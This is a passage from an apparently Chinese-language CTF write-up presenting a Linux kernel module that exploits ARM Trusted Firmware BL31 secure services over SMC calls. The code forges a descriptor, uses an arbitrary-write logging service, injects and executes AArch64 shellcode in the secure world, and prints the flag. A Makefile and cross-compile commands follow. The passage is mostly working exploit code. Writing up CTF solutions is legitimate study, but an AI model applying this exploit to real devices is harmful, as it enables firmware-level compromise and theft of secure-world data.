</span></span><span class="line"><span class="cl">    <span class="n">task2</span> <span class="o">=</span> <span class="nf">kthread_create</span><span class="p">(</span><span class="n">func2_thread</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="s">&#34;func2_thread&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">kthread_bind</span><span class="p">(</span><span class="n">task2</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">wake_up_process</span><span class="p">(</span><span class="n">task2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">task1</span> <span class="o">=</span> <span class="nf">kthread_create</span><span class="p">(</span><span class="n">func1_thread</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">task2</span><span class="p">,</span> <span class="s">&#34;func1_thread&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">kthread_bind</span><span class="p">(</span><span class="n">task1</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">wake_up_process</span><span class="p">(</span><span class="n">task1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">int</span> <span class="nf">step2_open</span><span class="p">(</span><span class="k">struct</span> <span class="n">inode</span> <span class="o">*</span><span class="n">inode</span><span class="p">,</span> <span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">file</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">pr_info</span><span class="p">(</span><span class="s">&#34;Step2: Device opened</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">arm_smccc_res</span> <span class="n">res</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">ns_mem</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">ns_mem</span> <span class="o">=</span> <span class="nf">phys_to_virt</span><span class="p">(</span><span class="n">BL31_NS_MEM</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">memset</span><span class="p">(</span><span class="n">ns_mem</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">ns_mem</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">ns_mem</span><span class="p">[</span><span class="mi">9</span><span class="p">]</span> <span class="o">=</span> <span class="n">MEMCPY_ADDR</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">ns_mem</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">ns_mem</span><span class="p">[</span><span class="mi">11</span><span class="p">]</span> <span class="o">=</span> <span class="n">SC_EXEC_ADDR</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">arm_smccc_smc</span><span class="p">(</span><span class="n">STORAGE_SVC_WR</span><span class="p">,</span> <span class="mh">0xf</span><span class="p">,</span> <span class="n">BL31_NS_MEM</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">res</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">//arm_smccc_smc(STORAGE_SVC_RD, 0xf, SC_RW_ADDR, 0x60, 0, 0, 0, 0, &amp;res);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">    <span class="n">ns_mem</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">FAKE_DESC</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">arm_smccc_smc</span><span class="p">(</span><span class="n">LOG_SVC_ABWR</span><span class="p">,</span> <span class="n">FAKE_DESC_ADDR</span><span class="p">,</span> <span class="n">BL31_NS_MEM</span><span class="p">,</span> <span class="mh">0x8</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">res</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="mh">0xA0</span><span class="p">,</span> <span class="mh">0x47</span><span class="p">,</span> <span class="mh">0xA8</span><span class="p">,</span> <span class="mh">0xF2</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x98</span><span class="p">,</span> <span class="mh">0xF2</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0xFC</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="mh">0x3B</span><span class="p">,</span> <span class="mh">0xD5</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0xB9</span><span class="p">,</span> <span class="mh">0x21</span><span class="p">,</span> <span class="mh">0xFC</span><span class="p">,</span> <span class="mh">0x3B</span><span class="p">,</span> <span class="mh">0xD5</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x04</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0xB9</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0xFC</span><span class="p">,</span> <span class="mh">0x3B</span><span class="p">,</span> <span class="mh">0xD5</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0xB9</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0xFC</span><span class="p">,</span> <span class="mh">0x3B</span><span class="p">,</span> <span class="mh">0xD5</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x0C</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0xB9</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="mh">0x81</span><span class="p">,</span> <span class="mh">0xFC</span><span class="p">,</span> <span class="mh">0x3B</span><span class="p">,</span> <span class="mh">0xD5</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0xB9</span><span class="p">,</span> <span class="mh">0xA1</span><span class="p">,</span> <span class="mh">0xFC</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="mh">0x3B</span><span class="p">,</span> <span class="mh">0xD5</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x14</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0xB9</span><span class="p">,</span> <span class="mh">0xC1</span><span class="p">,</span> <span class="mh">0xFC</span><span class="p">,</span> <span class="mh">0x3B</span><span class="p">,</span> <span class="mh">0xD5</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0xB9</span><span class="p">,</span> <span class="mh">0xE1</span><span class="p">,</span> <span class="mh">0xFC</span><span class="p">,</span> <span class="mh">0x3B</span><span class="p">,</span> <span class="mh">0xD5</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x1C</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0xB9</span><span class="p">,</span> <span class="mh">0xC0</span><span class="p">,</span> <span class="mh">0x03</span><span class="p">,</span> <span class="mh">0x5F</span><span class="p">,</span> <span class="mh">0xD6</span>
</span></span><span class="line"><span class="cl">    <span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm">        &#34;MOVK X0, #0x423d, LSL #16\n&#34;
</span></span></span><span class="line"><span class="cl"><span class="cm">        &#34;MOVK X0, #0xc100\n&#34;
</span></span></span><span class="line"><span class="cl"><span class="cm">        &#34;STR W1, [X0]\n&#34;
</span></span></span><span class="line"><span class="cl"><span class="cm">        &#34;MRS X1, S3_3_C15_C12_1\n&#34;
</span></span></span><span class="line"><span class="cl"><span class="cm">        &#34;STR W1, [X0,#4]\n&#34;
</span></span></span><span class="line"><span class="cl"><span class="cm">        &#34;MRS X1, S3_3_C15_C12_2\n&#34;
</span></span></span><span class="line"><span class="cl"><span class="cm">        &#34;STR W1, [X0,#8]\n&#34;
</span></span></span><span class="line"><span class="cl"><span class="cm">        &#34;MRS X1, S3_3_C15_C12_3\n&#34;
</span></span></span><span class="line"><span class="cl"><span class="cm">        &#34;STR W1, [X0,#0xC]\n&#34;
</span></span></span><span class="line"><span class="cl"><span class="cm">        &#34;MRS X1, S3_3_C15_C12_4\n&#34;
</span></span></span><span class="line"><span class="cl"><span class="cm">        &#34;STR W1, [X0,#0x10]\n&#34;
</span></span></span><span class="line"><span class="cl"><span class="cm">        &#34;MRS X1, S3_3_C15_C12_5\n&#34;
</span></span></span><span class="line"><span class="cl"><span class="cm">        &#34;STR W1, [X0,#0x14]\n&#34;
</span></span></span><span class="line"><span class="cl"><span class="cm">        &#34;MRS X1, S3_3_C15_C12_6\n&#34;
</span></span></span><span class="line"><span class="cl"><span class="cm">        &#34;STR W1, [X0,#0x18]\n&#34;
</span></span></span><span class="line"><span class="cl"><span class="cm">        &#34;MRS X1, S3_3_C15_C12_7\n&#34;
</span></span></span><span class="line"><span class="cl"><span class="cm">        &#34;STR W1, [X0,#0x1C]\n&#34;
</span></span></span><span class="line"><span class="cl"><span class="cm">        &#34;ret\n&#34;
</span></span></span><span class="line"><span class="cl"><span class="cm">    */</span>
</span></span><span class="line"><span class="cl">    <span class="nf">memcpy</span><span class="p">((</span><span class="kt">uint8_t</span> <span class="o">*</span><span class="p">)</span><span class="n">ns_mem</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="nf">arm_smccc_smc</span><span class="p">(</span><span class="n">LOG_SVC_ABWR</span><span class="p">,</span> <span class="n">SC_RW_ADDR</span><span class="p">,</span> <span class="n">BL31_NS_MEM</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">res</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">arm_smccc_smc</span><span class="p">(</span><span class="n">LOG_SVC_SC</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">res</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">pr_info</span><span class="p">(</span><span class="s">&#34;flag: %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="p">((</span><span class="kt">uint8_t</span> <span class="o">*</span><span class="p">)</span><span class="n">ns_mem</span><span class="p">)</span><span class="o">+</span><span class="mh">0x100</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">int</span> <span class="nf">step1_close</span><span class="p">(</span><span class="k">struct</span> <span class="n">inode</span> <span class="o">*</span><span class="n">inode</span><span class="p">,</span> <span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">file</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">pr_info</span><span class="p">(</span><span class="s">&#34;Step1: Device closed</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">int</span> <span class="nf">step2_close</span><span class="p">(</span><span class="k">struct</span> <span class="n">inode</span> <span class="o">*</span><span class="n">inode</span><span class="p">,</span> <span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">file</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">pr_info</span><span class="p">(</span><span class="s">&#34;Step2: Device closed</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="k">const</span> <span class="k">struct</span> <span class="n">file_operations</span> <span class="n">step1_fops</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="p">.</span><span class="n">open</span> <span class="o">=</span> <span class="n">step1_open</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">.</span><span class="n">release</span> <span class="o">=</span> <span class="n">step1_close</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="k">const</span> <span class="k">struct</span> <span class="n">file_operations</span> <span class="n">step2_fops</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="p">.</span><span class="n">open</span> <span class="o">=</span> <span class="n">step2_open</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">.</span><span class="n">release</span> <span class="o">=</span> <span class="n">step2_close</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">int</span> <span class="n">__init</span> <span class="nf">smc_driver_init</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">pr_info</span><span class="p">(</span><span class="s">&#34;SMC Driver: Initializing the driver</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">step1_major_number</span> <span class="o">=</span> <span class="nf">register_chrdev</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">DEVICE_NAME1</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">step1_fops</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">step1_major_number</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">pr_err</span><span class="p">(</span><span class="s">&#34;Step1: Failed to register a major number</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">step1_major_number</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">step1_class</span> <span class="o">=</span> <span class="nf">class_create</span><span class="p">(</span><span class="s">&#34;step1_class&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nf">IS_ERR</span><span class="p">(</span><span class="n">step1_class</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">unregister_chrdev</span><span class="p">(</span><span class="n">step1_major_number</span><span class="p">,</span> <span class="n">DEVICE_NAME1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">pr_err</span><span class="p">(</span><span class="s">&#34;Step1: Failed to register device class</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nf">PTR_ERR</span><span class="p">(</span><span class="n">step1_class</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">step1_device</span> <span class="o">=</span> <span class="nf">device_create</span><span class="p">(</span><span class="n">step1_class</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nf">MKDEV</span><span class="p">(</span><span class="n">step1_major_number</span><span class="p">,</span> <span class="mi">0</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">DEVICE_NAME1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nf">IS_ERR</span><span class="p">(</span><span class="n">step1_device</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">class_destroy</span><span class="p">(</span><span class="n">step1_class</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">unregister_chrdev</span><span class="p">(</span><span class="n">step1_major_number</span><span class="p">,</span> <span class="n">DEVICE_NAME1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">pr_err</span><span class="p">(</span><span class="s">&#34;Step1: Failed to create the device</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nf">PTR_ERR</span><span class="p">(</span><span class="n">step1_device</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">step2_major_number</span> <span class="o">=</span> <span class="nf">register_chrdev</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">DEVICE_NAME2</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">step2_fops</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">step2_major_number</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">pr_err</span><span class="p">(</span><span class="s">&#34;Step2: Failed to register a major number</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">step2_major_number</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">step2_class</span> <span class="o">=</span> <span class="nf">class_create</span><span class="p">(</span><span class="s">&#34;step2_class&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nf">IS_ERR</span><span class="p">(</span><span class="n">step2_class</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">unregister_chrdev</span><span class="p">(</span><span class="n">step2_major_number</span><span class="p">,</span> <span class="n">DEVICE_NAME2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">pr_err</span><span class="p">(</span><span class="s">&#34;Step2: Failed to register device class</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nf">PTR_ERR</span><span class="p">(</span><span class="n">step2_class</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">step2_device</span> <span class="o">=</span> <span class="nf">device_create</span><span class="p">(</span><span class="n">step2_class</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nf">MKDEV</span><span class="p">(</span><span class="n">step2_major_number</span><span class="p">,</span> <span class="mi">0</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">DEVICE_NAME2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nf">IS_ERR</span><span class="p">(</span><span class="n">step2_device</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">class_destroy</span><span class="p">(</span><span class="n">step2_class</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">unregister_chrdev</span><span class="p">(</span><span class="n">step2_major_number</span><span class="p">,</span> <span class="n">DEVICE_NAME2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">pr_err</span><span class="p">(</span><span class="s">&#34;Step2: Failed to create the device</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nf">PTR_ERR</span><span class="p">(</span><span class="n">step2_device</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">pr_info</span><span class="p">(</span><span class="s">&#34;SMC Driver: Device created successfully</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">void</span> <span class="n">__exit</span> <span class="nf">smc_driver_exit</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">pr_info</span><span class="p">(</span><span class="s">&#34;SMC Driver: Exiting the driver</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">device_destroy</span><span class="p">(</span><span class="n">step1_class</span><span class="p">,</span> <span class="nf">MKDEV</span><span class="p">(</span><span class="n">step1_major_number</span><span class="p">,</span> <span class="mi">0</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="nf">class_unregister</span><span class="p">(</span><span class="n">step1_class</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">class_destroy</span><span class="p">(</span><span class="n">step1_class</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">unregister_chrdev</span><span class="p">(</span><span class="n">step1_major_number</span><span class="p">,</span> <span class="n">DEVICE_NAME1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">device_destroy</span><span class="p">(</span><span class="n">step2_class</span><span class="p">,</span> <span class="nf">MKDEV</span><span class="p">(</span><span class="n">step2_major_number</span><span class="p">,</span> <span class="mi">0</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="nf">class_unregister</span><span class="p">(</span><span class="n">step2_class</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">class_destroy</span><span class="p">(</span><span class="n">step2_class</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">unregister_chrdev</span><span class="p">(</span><span class="n">step2_major_number</span><span class="p">,</span> <span class="n">DEVICE_NAME2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">module_init</span><span class="p">(</span><span class="n">smc_driver_init</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nf">module_exit</span><span class="p">(</span><span class="n">smc_driver_exit</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nf">MODULE_LICENSE</span><span class="p">(</span><span class="s">&#34;GPL&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nf">MODULE_DESCRIPTION</span><span class="p">(</span><span class="s">&#34;A driver to interact with ATF BL31 using SMC calls&#34;</span><span class="p">);</span></span></span></code></pre></td></tr></table>
</div>
</div>
    </div>
</div>

<script>
function toggleCode(element) {
    const codeContent = element.nextElementSibling;
    if (codeContent.style.display === "none" || codeContent.style.display === "") {
        codeContent.style.display = "block"; 
        codeContent.parentNode.classList.remove("code-has-hidden-child");
    } else {
        codeContent.style.display = "none"; 
        codeContent.parentNode.classList.add("code-has-hidden-child");
    }
}
</script><p>Makefile：</p>
<p>内核源码下载：<a href="https://mirrors.tuna.tsinghua.edu.cn/kernel/v6.x/linux-6.6.tar.xz">linux-6.6</a></p>
<div class="code-block">
    <div class="code-title" onclick="toggleCode(this)">
        
        <span class="code-block-open"><ion-icon name="chevron-down-outline"></ion-icon></span>
        <span class="code-block-close"><ion-icon name="chevron-forward-outline"></ion-icon></ion-icon></span>
        <span>makefile</span>
    </div>
    <div class="code-content">
        
        <div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-makefile" data-lang="makefile"><span class="line"><span class="cl"><span class="nv">obj-m</span> <span class="o">:=</span> smc_driver.o
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">KERNELDR</span> <span class="o">:=</span> <span class="k">$(</span>shell <span class="nb">pwd</span><span class="k">)</span>/linux-6.6
</span></span><span class="line"><span class="cl"><span class="nv">KERNEL_MODULE</span> <span class="o">:=</span> smc_driver.ko
</span></span><span class="line"><span class="cl"><span class="nv">KERNEL_MODULE_SRC</span> <span class="o">:=</span> smc_driver.c
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">PWD</span> <span class="o">:=</span> <span class="k">$(</span>shell <span class="nb">pwd</span><span class="k">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">$(KERNEL_MODULE)</span><span class="o">:</span> <span class="k">$(</span><span class="nv">KERNEL_MODULE_SRC</span><span class="k">)</span>
</span></span><span class="line"><span class="cl">	<span class="k">$(</span>MAKE<span class="k">)</span> -C <span class="k">$(</span>KERNELDR<span class="k">)</span> <span class="nv">M</span><span class="o">=</span><span class="k">$(</span>PWD<span class="k">)</span> modules
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">clean</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">	rm -rf *.o *.mod.c *.order *.symvers
</span></span></code></pre></td></tr></table>
</div>
</div>
    </div>
</div>

<script>
function toggleCode(element) {
    const codeContent = element.nextElementSibling;
    if (codeContent.style.display === "none" || codeContent.style.display === "") {
        codeContent.style.display = "block"; 
        codeContent.parentNode.classList.remove("code-has-hidden-child");
    } else {
        codeContent.style.display = "none"; 
        codeContent.parentNode.classList.add("code-has-hidden-child");
    }
}
</script><p>编译：</p>
<div class="code-block">
    <div class="code-title" onclick="toggleCode(this)">
        
        <span class="code-block-open"><ion-icon name="chevron-down-outline"></ion-icon></span>
        <span class="code-block-close"><ion-icon name="chevron-forward-outline"></ion-icon></ion-icon></span>
        <span>bash</span>
    </div>
    <div class="code-content">
        
        <div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">make <span class="nv">ARCH</span><span class="o">=</span>arm64 <span class="nv">CROSS_COMPILE</span><span class="o">=</span>aarch64-linux-gnu-
</span></span><span class="line"><span class="cl">make clean</span></span></code></pre></td></tr></table>
</div>
</div>
    </div>
</div>

<script>
function toggleCode(element) {
    const codeContent = element.nextElementSibling;
    if (codeContent.style.display === "none" || codeContent.style.display === "") {
        codeContent.style.display = "block"; 
        codeContent.parentNode.classList.remove("code-has-hidden-child");
    } else {
        codeContent.style.display = "none"; 
        codeContent.parentNode.classList.add("code-has-hidden-child");
    }
}
</script><h2 id="shellcode">Shellcode<a hidden class="anchor" aria-hidden="true" href="#shellcode">#</a></h2>
<p>shellcode.c</p>
<div class="code-block">
    <div class="code-title" onclick="toggleCode(this)">
        
